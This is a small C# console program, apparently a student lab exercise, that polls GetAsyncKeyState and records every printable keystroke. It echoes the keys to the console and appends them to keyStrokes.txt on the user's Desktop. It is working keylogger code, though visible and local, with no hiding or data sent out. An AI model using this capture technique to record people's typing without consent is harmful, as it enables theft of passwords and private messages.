using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
namespace laba4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            Console.Write("Нажатые клавиши: ");
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }
            string path = (folderPath + @"\keyStrokes.txt");
            if (File.Exists(path))
            {
                using (StreamWriter streamWriter = File.CreateText(path))
                {
                }
            }
            while (true)
            {
                Thread.Sleep(130);
                for (int i = 32; i < 127; i++)
                {
                    int keyPressed = GetAsyncKeyState(i);
                    if (keyPressed != 0)
                    {
                        Console.Write((char)i + " ");
                        using (StreamWriter streamWriter = File.AppendText(path))
                        {
                            streamWriter.Write((char)i);
                        }
                    }
                }
            }
        }
    }
}
